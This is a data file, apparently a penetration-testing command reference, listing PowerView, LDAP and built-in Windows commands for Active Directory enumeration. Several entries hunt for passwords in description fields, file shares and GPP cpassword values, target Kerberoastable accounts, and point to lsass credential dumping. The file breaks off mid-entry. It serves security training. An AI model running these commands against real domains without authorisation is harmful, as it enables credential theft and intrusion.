"powerview-get-netgroupmember","Get Group Members Resolved (PowerView)","enumeration","Get-NetGroupMember -Identity ""<GROUPNAME>""","List group members with resolved usernames and object types (cleaner than Get-NetGroup)","","Get-NetGroupMember -Identity ""Domain Admins""","CLEANER OUTPUT:
Resolves DNs to usernames.
Shows object types (user vs group).

MEMBEROBJECTCLASS:
- user:
objectClass=user
- group:
objectClass=group (nested)

-RECURSE FLAG:
Automatically resolves nested groups.
Essential for finding all effective members.

OSCP:
Always use -Recurse for privileged groups.
Find hidden admin accounts in subgroups.

Time:
5-10 seconds","high","","","","{""Nested groups not showing users"": ""Add -Recurse flag: Get-NetGroupMember -Identity \""<GROUPNAME>\"" -Recurse"", ""Group not found"": ""Use quotes for group names with spaces""}","{""-Identity"": ""Group to enumerate members for. More user-friendly output than Get-NetGroup."", ""-Recurse (optional)"": ""Resolves nested groups recursively. Use: Get-NetGroupMember -Identity \""<GROUPNAME>\"" -Recurse""}","[""import-powerview"", ""powerview-get-netgroup""]","[""powerview-get-netgroup-specific"", ""net-group-domain-members""]",""
"powerview-get-netcomputer","Enumerate Domain Computers (PowerView)","enumeration","Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion","List all domain-joined computers with OS information for targeting","","","ALL DOMAIN COMPUTERS:
No network scanning required.

KEY FIELDS:
- operatingsystem:
Identify legacy (7, 2008)
- operatingsystemversion:
Exact build for CVE
- dnshostname:
FQDN for connections

FILTER EXAMPLES:
  Get-NetComputer -OperatingSystem '*Server*'
  Get-NetComputer -OperatingSystem '*2008*'

OSCP:
Focus on legacy OS and servers.
Higher misconfigurations/unpatched vulns.

Time:
10-30 seconds","high","","","","{""Module not imported"": ""Import-Module .\\PowerView.ps1"", ""Output too large"": ""Filter by OS: Get-NetComputer -OperatingSystem '*Server*' | select dnshostname,operatingsystem""}","{""select dnshostname,operatingsystem,operatingsystemversion"": ""Filters output to show hostname (for connection), OS name (for targeting), and build number (for vulnerability matching).""}","[""import-powerview""]","[""ps-directorysearcher-computers"", ""dsquery-computer""]",""
"powerview-get-netou","Enumerate Organizational Units (PowerView)","enumeration","Get-NetOU | select name,distinguishedname","List all Organizational Units to understand domain structure and delegation","","","OUs ORGANIZE OBJECTS:
For management and GPO application.

COMMON OUs:
- Domain Controllers:
DCs
- Computers:
Workstations
- Servers:
Servers
- Custom:
By department/function

INTERESTING OUs:
- Service Accounts
- Privileged Users
- Disabled Users

OSCP:
Less critical than users/groups/computers.
Can reveal admin practices.

Time:
5-10 seconds","medium","","","","{""Module not imported"": ""Import-Module .\\PowerView.ps1""}","{""select name,distinguishedname"": ""Shows OU name and full LDAP path. Distinguished name reveals OU hierarchy.""}","[""import-powerview""]","",""
"powerview-get-netgpo","Enumerate Group Policy Objects (PowerView)","enumeration","Get-NetGPO | select displayname,whenchanged","List all Group Policy Objects in the domain to identify policies and configurations","","","GPOs DEFINE SETTINGS:
- Password policies
- Software installation
- Scripts
- Security settings

DEFAULT DOMAIN POLICY:
Controls password requirements and lockout.

VULNERABILITIES:
- GPP passwords (cpassword attribute)
- Startup scripts with hardcoded creds
- Weak security settings

WHENCHANGED:
Recent changes = testing/debugging (weak security).

OSCP:
Find GPP passwords in SYSVOL.
Old vuln, still present in legacy.

Time:
5-10 seconds","medium","","","","{""Module not imported"": ""Import-Module .\\PowerView.ps1""}","{""select displayname,whenchanged"": ""Shows GPO name and last modification date. Recent changes may indicate active admin work or policy testing.""}","[""import-powerview""]","",""
"powerview-get-netforest","Get Forest Information (PowerView)","enumeration","Get-NetForest","Retrieve AD forest information including domains, global catalog, and forest functional level","","","AD FORESTS:
One or more domains in trust relationship.

SINGLE DOMAIN:
Forest = Domain (little value).

MULTI-DOMAIN:
Reveals structure and trust relationships.

ENTERPRISE ADMINS:
Exists only in root domain.
Admin rights across ALL forest domains.

OSCP:
Most exams are single-domain.
Use for multi-domain scenarios.

ALTERNATIVE:
  [system.directoryservices.activedirectory.forest]::getcurrentforest()

Time:
<5 seconds","medium","","","","{""Module not imported"": ""Import-Module .\\PowerView.ps1""}","","[""import-powerview""]","",""
"powerview-get-netuser-all","Enumerate All Domain Users (PowerView)","enumeration","Get-NetUser | select samaccountname,description,pwdlastset,lastlogon","List all domain users with key properties using PowerView","","","CHECK DESCRIPTION FIELDS:
Admins often store passwords there.

COMMON PATTERNS:
- 'temp password'
- 'default password'
- 'reset to'
- 'password:
Winter2023'

FILTER:
  | ? {$_.description -match 'password|pwd|pw'}","high","","","","{""Get-NetUser not recognized"": ""Import PowerView first: . .\\PowerView.ps1 or Import-Module PowerView.psd1""}","{""samaccountname"": ""Username (SAM account name)"", ""description"": ""User description field (often contains useful info like 'temp password: Winter2023')"", ""pwdlastset"": ""When password was last changed (identify stale accounts)"", ""lastlogon"": ""Last logon timestamp (identify active vs inactive accounts)""}","[""import-powerview"", ""download-powerview""]","[""ldapsearch-users-ad"", ""enum4linux-users-ad"", ""get-aduser""]","[""powerview-find-localadminaccess"", ""powerview-get-netcomputer"", ""impacket-getuserspns-kerberoast""]"
"powerview-get-netcomputer-all","Enumerate All Domain Computers (PowerView)","enumeration","Get-NetComputer | select dnshostname,operatingsystem,lastlogon","List all domain computers with OS version and last logon","","","TARGET OLDER OS:
Server 2008, 2012 - likely unpatched.

LASTLOGON:
Identify active machines.

FILTER:
  | ? {$_.operatingsystem -match 'Server 2008|2012'}","medium","","","","","{""dnshostname"": ""Computer's DNS hostname (FQDN)"", ""operatingsystem"": ""OS version (identify outdated/vulnerable systems)"", ""lastlogon"": ""Last logon timestamp (find active vs stale computers)""}","[""import-powerview""]","",""
"powerview-get-netcomputer-ping","Find Live Domain Computers (PowerView)","enumeration","Get-NetComputer -Ping | select dnshostname","Enumerate domain computers and test connectivity with ICMP ping","","","WARNING:
Slow on large domains (250+ computers).

USE FOR:
- Small environments
- Need only active targets

ALTERNATIVE:
Get all computers, then port scan.","medium","","","","{""No pingable hosts"": ""ICMP may be blocked. Try without -Ping flag to get all computers.""}","{""-Ping"": ""Tests ICMP connectivity to each computer. Only returns live/reachable hosts. WARNING: Slow on large domains (250+ computers).""}","[""import-powerview""]","",""
"powerview-get-netgroup-recursive","Get Group Members Recursively (PowerView)","enumeration","Get-NetGroupMember -GroupName ""Domain Admins"" -Recurse","List all members of a group including nested group memberships","","","Critical for identifying privilege escalation paths.

Nested groups often overlooked.

EXAMPLE CHAIN:
User  Helpdesk  ServerAdmins  Domain Admins

USE -RECURSE:
Finds all effective members through nested groups.","high","","","","{""Group not found"": ""Verify group name: Get-NetGroup | select name""}","{""-GroupName"": ""Target group to enumerate (use quotes for names with spaces)"", ""-Recurse"": ""Follows nested group memberships. If User A is in GroupB, and GroupB is in Domain Admins, User A is returned.""}","[""import-powerview""]","",""
"ps-get-current-domain","Get Current Domain (PowerShell)","enumeration","[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()","Retrieve current AD domain information including forest, domain controllers, and PDC role owner using .NET Framework","","",".NET SYSTEM.DIRECTORYSERVICES:
Available in PowerShell by default (no imports needed).

COMMAND:
  [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

RETURNS:
- PdcRoleOwner:
Primary DC for enumeration
- DomainControllers:
All DCs in domain
- Forest:
Multi-domain environments
- Name:
Domain DNS name

OSCP ADVANTAGE:
No PowerView or special tools required.
Works on any domain-joined Windows machine with PowerShell.

ALTERNATIVE:
  $env:userdnsdomain

Time:
<5 seconds","high","","","","{""Cannot find type"": ""PowerShell version too old. Use PowerShell 3.0+. Check version: $PSVersionTable"", ""Access is denied"": ""Not logged in with domain account. Verify: whoami /fqdn""}","","","[""get-netdomain""]","[""ps-get-pdc"", ""ps-build-ldap-path""]"
"ps-get-pdc","Get Primary Domain Controller (PowerShell)","enumeration","[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name","Extract the Primary Domain Controller hostname - the most authoritative DC for LDAP queries","","","WHY TARGET THE PDC:
- Most authoritative and up-to-date AD data
- Only ONE PDC per domain
- Non-PDC DCs may have stale replication data

COMMAND:
  [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name

USAGE:
Store in variable:
  $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name

OSCP:
Use this to build LDAP path for DirectorySearcher queries.

Time:
<5 seconds","high","","","","{""Property cannot be found"": ""Domain object not populated. Run full command: [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() first""}","{"".PdcRoleOwner.Name"": ""Accesses the PdcRoleOwner property (which DC holds PDC role) and extracts its Name (hostname). PDC is the most up-to-date DC - use this for enumeration to ensure accurate results.""}","[""ps-get-current-domain""]","[""net-domain-controllers""]","[""ps-build-ldap-path""]"
"ps-get-distinguished-name","Get Domain Distinguished Name (PowerShell)","enumeration","([adsi]'').distinguishedName","Retrieve the domain's Distinguished Name in LDAP format (DC=corp,DC=com)","","","DISTINGUISHED NAMES (DN):
Unique identifiers in LDAP.

FORMAT:
CN=name,OU=container,DC=domain,DC=tld

READ RIGHT-TO-LEFT:
- DC components:
Domain (top of hierarchy)
- OU/CN components:
Location within domain

EXAMPLE:
Domain 'corp.com'  DN is 'DC=corp,DC=com'

COMMAND:
  ([adsi]'').distinguishedName

OSCP:
Required for building LDAP connection strings.

Time:
<5 seconds","high","","","","{""Unable to contact the server"": ""Not logged in to domain or DC unreachable. Verify: whoami /fqdn""}","{""[adsi]''"": ""ADSI (Active Directory Service Interfaces) accelerator. Empty string queries the root of the AD hierarchy (the domain itself)."", "".distinguishedName"": ""Returns the DN (Distinguished Name) - LDAP-formatted path to the domain object. Format: DC=domain,DC=tld.""}","","","[""ps-build-ldap-path""]"
"ps-build-ldap-path","Build Complete LDAP Path (PowerShell)","enumeration","$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name; $DN = ([adsi]'').distinguishedName; $LDAP = ""LDAP://$PDC/$DN""; $LDAP","Construct full LDAP path for DirectorySearcher queries by combining PDC hostname and Distinguished Name","","","LDAP PATH FORMAT:
LDAP://HostName/DistinguishedName

COMPONENTS:
- HostName:
PDC for accuracy
- DistinguishedName:
Domain DN (searchbase)

TELLS DIRECTORYSEARCHER:
- WHERE to search:
PDC
- WHAT to search:
Entire domain from root

COMMAND:
  $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
  $DN = ([adsi]'').distinguishedName
  $LDAP = ""LDAP://$PDC/$DN""
  $LDAP

OSCP:
Foundation for all manual LDAP enumeration.
Memorize this pattern.

Time:
5-10 seconds","high","","","","{""LDAP path incomplete"": ""Check variables populated: echo $PDC; echo $DN"", ""Query fails with invalid path"": ""Verify DC reachable: ping $PDC""}","","[""ps-get-pdc"", ""ps-get-distinguished-name""]","","[""ps-directorysearcher-users""]"
"ps-directorysearcher-users","Enumerate Users with DirectorySearcher (PowerShell)","enumeration","$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name; $DN = ([adsi]'').distinguishedName; $LDAP = ""LDAP://$PDC/$DN""; $direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP); $dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry); $dirsearcher.filter=""samAccountType=805306368""; $dirsearcher.FindAll()","Search Active Directory for all user objects using DirectorySearcher .NET class with LDAP filter","","","SAMACCOUNTTYPE VALUES:
- 805306368:
Users
- 805306369:
Computers  
- 268435456:
Groups

LDAP FILTER SYNTAX:
- (attribute=value):
Equality
- (attribute=*value*):
Wildcards
- (&(filter1)(filter2)):
AND
- (|(filter1)(filter2)):
OR

OUTPUT:
Contains ALL user attributes.
Pipe to select for clean output:
  | ForEach-Object {$_.Properties.samaccountname}

OSCP:
PowerView-free enumeration.
Works in restricted environments where imports blocked.

Time:
10-30 seconds","high","","","","{""No results"": ""LDAP filter may be wrong. Test without filter: $dirsearcher.filter=\""objectClass=user\""; $dirsearcher.FindAll()"", ""Too much output"": ""Filter specific attributes: $obj.Properties | select samaccountname,description""}","{""DirectoryEntry"": ""Encapsulates an AD object (the domain root in this case). Provides the LDAP connection for queries."", ""DirectorySearcher"": ""Performs LDAP queries against AD. Requires DirectoryEntry as searchbase."", ""filter"": ""LDAP filter syntax. samAccountType=805306368 filters for normal user accounts (decimal value for 0x30000000)."", ""FindAll()"": ""Executes the search and returns ALL matching objects (all users in this case).""}","[""ps-build-ldap-path""]","[""get-netuser""]",""
"ps-directorysearcher-groups","Enumerate Groups with DirectorySearcher (PowerShell)","enumeration","$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name; $DN = ([adsi]'').distinguishedName; $LDAP = ""LDAP://$PDC/$DN""; $direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP); $dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry); $dirsearcher.filter=""objectClass=group""; $result = $dirsearcher.FindAll(); foreach($group in $result){$group.properties | select {$_.cn},{$_.member}}","Search Active Directory for all group objects and display group names with members","","","GROUP MEMBER ATTRIBUTE:
Contains distinguished names (DNs).

FORMAT:
- Users:
CN=username,CN=Users,DC=corp,DC=com
- Nested groups:
CN=groupname,CN=Users,DC=corp,DC=com

NESTED GROUP DETECTION:
If member DN contains 'CN=Users' or 'OU='  likely a group.
Enumerate recursively to find all users.

OSCP TARGETS:
Look for groups with 'Admin', 'IT', 'Service' in CN.
Often have elevated privileges.

Time:
10-30 seconds","high","","","","{""Nested groups not showing users"": ""Member attribute shows distinguished names. CN=user is a user, CN=group,CN=Users is a nested group. Query nested group separately."", ""Output format messy"": ""Use select-object: $group.properties.member | Format-List""}","{""objectClass=group"": ""LDAP filter for group objects. More inclusive than samAccountType - returns all group types (security groups, distribution groups, domain local, global, universal)."", ""foreach loop"": ""Iterates through each group object in results."", ""select {$_.cn},{$_.member}"": ""Extracts Common Name (group name) and member attribute (group members).""}","[""ps-build-ldap-path""]","[""get-netgroup""]",""
"ps-directorysearcher-computers","Enumerate Computers with DirectorySearcher (PowerShell)","enumeration","$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name; $DN = ([adsi]'').distinguishedName; $LDAP = ""LDAP://$PDC/$DN""; $direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP); $dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry); $dirsearcher.filter=""samAccountType=805306369""; $result = $dirsearcher.FindAll(); foreach($computer in $result){$computer.properties | select {$_.cn},{$_.operatingsystem},{$_.dnshostname}}","Search Active Directory for all computer objects and display hostnames with operating systems","","","COMPUTER OBJECTS:
Reveal network topology without port scanning.

KEY ATTRIBUTES:
- operatingsystem:
Identify legacy systems (Windows 7, Server 2008)
- operatingsystemversion:
Exact build number
- lastLogon:
Active vs dormant computers
- dnshostname:
FQDN for connections

OSCP TARGETS:
Focus on legacy OS versions and servers.
Higher chance of unpatched vulnerabilities.

Time:
10-30 seconds","high","","","","{""Operating system field empty"": ""Some computer objects don't have OS populated. Check other attributes: $computer.properties"", ""DC not showing"": ""Use userAccountControl filter for DCs. Flag 8192 = Domain Controller.""}","{""samAccountType=805306369"": ""LDAP filter for computer objects (decimal for 0x30000001). Matches domain-joined workstations, servers, and domain controllers."", ""{$_.cn}"": ""Common Name - computer hostname without domain suffix."", ""{$_.operatingsystem}"": ""OS version (Windows 10, Windows Server 2019, etc.) - useful for targeting legacy systems."", ""{$_.dnshostname}"": ""Fully qualified domain name (hostname.domain.com) - use this for network connections.""}","[""ps-build-ldap-path""]","[""get-netcomputer"", ""dsquery-computer""]",""
"ps-ldapsearch-function","Reusable LDAP Search Function (PowerShell)","enumeration","function LDAPSearch { param ([string]$LDAPQuery); $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name; $DistinguishedName = ([adsi]'').distinguishedName; $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry(""LDAP://$PDC/$DistinguishedName""); $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery); return $DirectorySearcher.FindAll() }","Create reusable PowerShell function for LDAP queries - accepts LDAP filter as parameter","","","REUSABLE LDAP FUNCTION:
Encapsulates all previous LDAP steps.

USAGE EXAMPLES:
- Users:
LDAPSearch ""(samAccountType=805306368)""
- Groups:
LDAPSearch ""(objectCategory=group)""
- Kerberoastable:
LDAPSearch ""(&(objectCategory=user)(servicePrincipalName=*))""

OSCP WORKFLOW:
1.

Save function to file:
function | Out-File LDAPSearch.ps1

2.

Import at start:
Import-Module .\LDAPSearch.ps1

3.

Use throughout enumeration

ADVANTAGE:
PowerView-free, exam-safe enumeration.
Eliminates repetitive typing.

Time:
Function creation 10 seconds, usage <5 seconds","high","","","","{""Function not found"": ""Import module first: Import-Module .\\LDAPSearch.ps1"", ""LDAP query syntax error"": ""Test filter manually first with DirectorySearcher"", ""No results"": ""Verify LDAP filter syntax. Common filters: (objectClass=user), (objectCategory=group), (samAccountType=805306368)""}","{""param ([string]$LDAPQuery)"": ""Function parameter - accepts LDAP filter string from command line"", ""return $DirectorySearcher.FindAll()"": ""Returns all matching AD objects for the provided filter""}","[""ps-build-ldap-path"", ""ps-directorysearcher-users""]","",""
"ps-ldapsearch-users","LDAP Query All Users (PowerShell)","enumeration","LDAPSearch -LDAPQuery ""(objectClass=user)""","Query all user objects using manual LDAP search function","","","REQUIRES:
LDAPSearch function defined first.

RETURNS:
User AND computer objects (computers inherit from user class).

FILTER COMPUTERS:
- LDAP:
(&(objectClass=user)(!(objectClass=computer)))
- PowerShell:
| ? {$_.Properties.samaccountname -notmatch '\$$'}

Time:
<10 seconds","high","","","","{""Function not defined"": ""Create LDAPSearch function first: ps-ldapsearch-function"", ""Returns computer accounts"": ""Filter computers: (&(objectClass=user)(!(objectClass=computer)))""}","{""(objectClass=user)"": ""LDAP filter matching all user objects. Returns both user accounts and computer accounts (computers inherit from user class).""}","[""ps-ldapsearch-function""]","[""get-netuser""]",""
"ps-ldapsearch-computers","LDAP Query All Computers (PowerShell)","enumeration","LDAPSearch -LDAPQuery ""(objectClass=computer)""","Query all computer objects in the domain","","","QUERY ALL COMPUTERS:
RETURNS:
- DNS hostname
- OS version
- Last logon
- Operating system details

USAGE:
  LDAPSearch -LDAPQuery ""(objectClass=computer)"" | select -ExpandProperty Properties | select dnshostname,operatingsystem

Time:
<10 seconds","medium","","","","","{""(objectClass=computer)"": ""LDAP filter matching computer accounts. Computer SAM names end with $.""}","[""ps-ldapsearch-function""]","[""get-netcomputer""]",""
"ps-ldapsearch-groups","LDAP Query All Groups (PowerShell)","enumeration","LDAPSearch -LDAPQuery ""(objectClass=group)""","Query all group objects in the domain","","","QUERY ALL GROUPS:
FOCUS ON:
- Domain Admins
- Enterprise Admins
- Administrators
- Custom admin groups

GET MEMBERS:
  $group.Properties.member

Time:
<10 seconds","medium","","","","","{""(objectClass=group)"": ""LDAP filter for group objects. Includes security and distribution groups.""}","[""ps-ldapsearch-function""]","[""get-netgroup""]",""
"ps-ldapsearch-spns","LDAP Query Kerberoastable Accounts (PowerShell)","enumeration","LDAPSearch -LDAPQuery ""(&(objectClass=user)(servicePrincipalName=*))""","Query all user accounts with SPNs registered (Kerberoastable)","","","KERBEROASTING TARGETS:
QUERY:
  LDAPSearch -LDAPQuery ""(&(objectClass=user)(servicePrincipalName=*))""

WHY THIS MATTERS:
User accounts with SPNs  can request TGS tickets.
TGS encrypted with service account password hash.
Crack offline, no account lockout.

NEXT STEPS:
- Request TGS tickets
- Extract with Rubeus/Mimikatz
- Crack with hashcat

Time:
<10 seconds","high","","","","{""No results"": ""No SPNs registered. Try PowerView: Get-NetUser -SPN""}","{""(&(objectClass=user)(servicePrincipalName=*))"": ""Compound LDAP filter: user objects AND has SPN attribute. The & means AND, * means any value.""}","[""ps-ldapsearch-function""]","[""get-netuser""]",""
"ps-ldapsearch-admins","LDAP Query Privileged Accounts (PowerShell)","enumeration","LDAPSearch -LDAPQuery ""(adminCount=1)""","Query all accounts with adminCount=1 (privileged accounts)","","","ADMINCOUNT ATTRIBUTE:
QUERY:
  LDAPSearch -LDAPQuery ""(adminCount=1)""

WHAT IT MEANS:
Account is/was in privileged group.

ADMINSDHOLDER PROCESS:
Sets this flag on:
- Domain Admins
- Enterprise Admins  
- Account Operators
- Backup Operators
- Server Operators
- Other high-privilege groups

OSCP:
Identify privileged accounts for targeting.

Time:
<10 seconds","high","","","","","{""(adminCount=1)"": ""Identifies accounts protected by AdminSDHolder. These are privileged accounts (Domain Admins, Enterprise Admins, etc.). AdminSDHolder sets inheritance flag and ACLs hourly.""}","[""ps-ldapsearch-function""]","",""
"powerview-get-netsession","Enumerate Active Sessions (PowerView)","enumeration","Get-NetSession -ComputerName <TARGET>","List active user sessions on a remote computer using NetSessionEnum API","","Get-NetSession -ComputerName DC1.corp.com","NetSessionEnum API queries SrvsvcSessionInfo registry key on target.

Windows 11/Server 2022+ restrict access by default (only SYSTEM/Administrators can read).

Returns sessions created via SMB/file shares.

CName = source computer establishing the session, UserName = user account.

If you see admin sessions, target that source computer for credential theft (mimikatz, lsass dump).

OSCP:
Works on legacy systems (Windows 7, Server 2008-2016) but often fails on modern Windows.

Have alternatives ready.","high","","","","{""Access is denied"": ""NetSessionEnum requires SrvsvcSessionInfo registry read access. This is blocked on Windows 11/Server 2022+ by default. Use Get-NetLoggedon or PsLoggedOn instead."", ""RPC server unavailable"": ""Target firewall blocking RPC. Verify connectivity: Test-Connection -ComputerName <TARGET>"", ""No sessions found"": ""No active sessions OR permissions issue. Try PsLoggedOn if you have admin access.""}","{""-ComputerName"": ""Specifies the target computer to query sessions on. Uses NetSessionEnum API which requires specific registry permissions on target.""}","[""import-powerview""]","[""psloggedon""]",""
"powerview-get-netloggedon","Get Logged On Users (PowerView)","enumeration","Get-NetLoggedon -ComputerName <TARGET>","Enumerate users currently logged on to a remote computer (requires local admin or Remote Registry service)","","Get-NetLoggedon -ComputerName WEB04.corp.com","Uses Remote Registry service to query HKEY_USERS hive and enumerate loaded user profiles (= logged-on users).

Remote Registry is disabled by default on Windows 8+ workstations but enabled on servers (2012+).

Requires local admin OR Remote Registry service explicitly enabled.

More reliable than Get-NetSession on modern Windows.

Returns interactive logons (RDP, console) and service logons.

OSCP:
If you have local admin, this works.

If not, it likely fails.","high","","","","{""Access Denied"": ""Requires local admin on target OR Remote Registry service enabled. Check permissions: Test-AdminAccess -ComputerName <TARGET>"", ""Remote Registry service not running"": ""Service disabled. Use Find-LocalAdminAccess to find systems where you have admin rights."", ""RPC server unavailable"": ""Target firewall blocking RPC or system offline""}","{""-ComputerName"": ""Target computer to query. Uses Remote Registry service to enumerate logged-on users from registry hives.""}","[""import-powerview""]","[""psloggedon""]",""
"powerview-find-localadminaccess","Find Local Admin Access (PowerView)","enumeration","Find-LocalAdminAccess","Scan the domain to identify computers where current user has local administrator privileges","","","Connects to each domain computer's Service Control Manager (OpenServiceW function) with SC_MANAGER_ALL_ACCESS rights.

If connection succeeds, you have local admin.

Scans entire domain (slow in large environments - may take 5-15 minutes).

Results reveal lateral movement opportunities:
computers where you can execute code as admin, dump credentials, install backdoors.

OSCP:
Run this early to map attack surface.

Any system with admin access is a potential pivot point for credential theft.","high","","","","{""Module not imported"": ""Import-Module .\\PowerView.ps1"", ""Long execution time"": ""Scans entire domain. Limit scope with -ComputerName parameter for specific targets."", ""No systems found"": ""Your user has no local admin rights. Check group memberships: Get-NetUser -Identity <YOU> | select memberof""}","","[""import-powerview""]","",""
"powerview-find-domainshare","Find Domain Shares (PowerView)","enumeration","Find-DomainShare","Discover all file shares in the domain to identify accessible data and potential credential storage","","","Returns all shares from all domain computers:
default shares (ADMIN$, C$, IPC$, NETLOGON, SYSVOL) and custom shares (data, backups, users).

Custom shares often contain sensitive data:
credentials in scripts, configuration files, password databases, backup files.

SYSVOL share always accessible (domain-wide readable) - search for GPP passwords (cpassword attribute in Groups.xml, ScheduledTasks.xml).

OSCP:
Always enumerate shares - common source of credentials and sensitive information.","high","","","","{""Module not imported"": ""Import-Module .\\PowerView.ps1"", ""Too many results"": ""Filter with -ExcludeStandard -ExcludeIPC to remove default shares"", ""Long execution time"": ""Scans entire domain. Specify -ComputerName for specific targets.""}","{""-CheckShareAccess (optional)"": ""Only return shares you can access. Use: Find-DomainShare -CheckShareAccess"", ""-ExcludeStandard (optional)"": ""Exclude standard shares (ADMIN$, C$, IPC$). Use: Find-DomainShare -ExcludeStandard"", ""-ExcludeIPC (optional)"": ""Exclude IPC$ shares. Use: Find-DomainShare -ExcludeIPC""}","[""import-powerview""]","",""
"powerview-find-domainshare-accessible","Find Accessible Domain Shares (PowerView)","enumeration","Find-DomainShare -CheckShareAccess","List only file shares you can actually access (tests read permissions)","","","Automatically tests read access to every discovered share.

Much faster than manually testing each share.

Results are immediately actionable - you can access these shares.

Focus on non-standard shares (not ADMIN$, C$, IPC$).

Common findings:
user home directories, department shares (HR, Finance, IT), backup shares, application config shares.

OSCP:
Use this to quickly identify where you can read sensitive data.

Look for config files, scripts, and credentials.","high","","","","{""Module not imported"": ""Import-Module .\\PowerView.ps1"", ""Long execution time"": ""Tests access to every share in domain. Be patient or limit scope with -ComputerName."", ""No accessible shares"": ""Your user has minimal permissions. Check group memberships for share access.""}","{""-CheckShareAccess"": ""Tests read access to each discovered share. Only returns shares you can access.""}","[""import-powerview""]","",""
"sysinternals-psloggedon","PsLoggedOn (Sysinternals)","enumeration",".\PsLoggedon.exe \\<TARGET>","Sysinternals tool to enumerate logged-on users via Remote Registry (more reliable than PowerView on modern Windows)","",".\PsLoggedon.exe \\FILES04.corp.com","More reliable than PowerView's Get-NetLoggedon/Get-NetSession on modern Windows.

Uses two methods:
(1) Remote Registry (queries HKEY_USERS for loaded profiles), (2) NetSessionEnum (lists resource share sessions).

Remote Registry auto-starts when you connect if service is set to 'Manual' (default on servers).

Returns both interactive logons (RDP, console) and resource share logons (file shares).

OSCP:
Keep this in your toolkit - works when PowerView fails.

Especially useful on Windows Server targets.","high","","","","{""Access Denied"": ""Remote Registry service disabled or insufficient permissions. Need local admin OR service enabled."", ""Unable to query resource logons"": ""NetSessionEnum API blocked (normal on Windows 11/Server 2022+). Local logon enumeration still works."", ""Tool not found"": ""Download Sysinternals Suite: https://live.sysinternals.com/PsLoggedon.exe""}","","","[""powerview-get-netloggedon""]",""
"net-view-shares","List Shares with net view","enumeration","net view \\<TARGET>","Built-in Windows command to list all shares on a remote computer","","net view \\FILES04.corp.com","Built-in Windows tool, available on all systems.

Lists both default shares (ADMIN$, C$, IPC$) and custom shares.

Does not test access - just lists share names.

Faster than PowerView for single-target enumeration.

Type field shows Disk (file share), Print (printer share), IPC (inter-process communication).

OSCP:
Use this for quick manual share enumeration when PowerView is unavailable or restricted.","high","","","","{""Access is denied"": ""No permissions to list shares. Try different target or authenticate: net use \\\\<TARGET> /user:<DOMAIN>\\<USERNAME>"", ""Network path was not found"": ""Target unreachable or SMB disabled. Check connectivity: ping <TARGET>""}","","","[""powerview-find-domainshare""]",""
"test-share-access","Test Share Access","enumeration","dir \\<TARGET>\<SHARE>","Test read access to a network share using built-in Windows dir command","","dir \\FILES04.corp.com\backup","Simple test for share accessibility.

If dir succeeds, you have at least read access.

Recurse with /s to list all subdirectories and files.

Pipe to findstr to search for interesting files:
dir /s /b | findstr /I password config backup.

Check file timestamps to identify recently modified files (may contain current credentials).

OSCP:
Always test SYSVOL share first - domain-wide readable, often contains GPP passwords in Policies folder.","high","","","","{""Access is denied"": ""No read permissions. Try other shares or authenticate with different credentials."", ""Logon failure"": ""Invalid credentials. Re-authenticate: net use \\\\<TARGET>\\<SHARE> /user:<DOMAIN>\\<USERNAME>""}","","[""smbmap-shares"", ""enum4linux-smb""]","[""smbmap-enumerate-auth"", ""crackmapexec-smb-framework""]","[""search-share-files"", ""dir-admin-share"", ""gpp-password-decrypt""]"
"search-share-files","Search Share for Sensitive Files","enumeration","findstr /S /I /M /P ""<PATTERN>"" \\<TARGET>\<SHARE>\*.*","Recursively search files in a network share for sensitive patterns (passwords, credentials, config)","","findstr /S /I /M /P ""password"" \\FILES04\backup\*.*","Common search patterns:
password, pwd, pass, credential, key, secret, token, api_key, backup, config, admin.

Interesting file extensions:
.txt, .xml, .config, .ini, .bat, .ps1, .sql, .bak, .old.

Check SYSVOL\Policies for GPP passwords in Groups.xml and ScheduledTasks.xml.

Search for cpassword attribute.

OSCP:
This is how you find credentials in shares - systematic search beats manual browsing.","high","","","","{""Access is denied"": ""No read permissions on some files. Results may be incomplete."", ""Long execution time"": ""Large share or slow network. Limit scope to specific file types: findstr /S /I \""password\"" *.txt *.xml *.config"", ""Too many false positives"": ""Refine pattern: findstr /S /I \""password =\"" *.config""}","{""/S"": ""Search subdirectories recursively."", ""/I"": ""Case-insensitive search."", ""/M"": ""Print only filenames that contain matches (not matched lines - useful for finding files)."", ""/P"": ""Skip files with non-printable characters (binary files).""}","[""test-share-access"", ""smbmap-shares""]","[""smbmap-enumerate-auth"", ""dir-admin-share""]","[""gpp-password-decrypt"", ""file-transfer-smb"", ""cat-file""]"
"gpp-password-decrypt","Decrypt GPP Password","enumeration","gpp-decrypt ""<CPASSWORD>""","Decrypt AES-encrypted Group Policy Preference passwords found in SYSVOL using published Microsoft AES key","","gpp-decrypt ""+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE""","GPP (Group Policy Preferences) passwords were stored AES-256 encrypted in SYSVOL.

Microsoft published the AES key on MSDN (MS14-025), allowing anyone to decrypt.

Common locations:
Groups.xml (local admin password), ScheduledTasks.xml (scheduled task credentials), Services.xml (service account passwords).

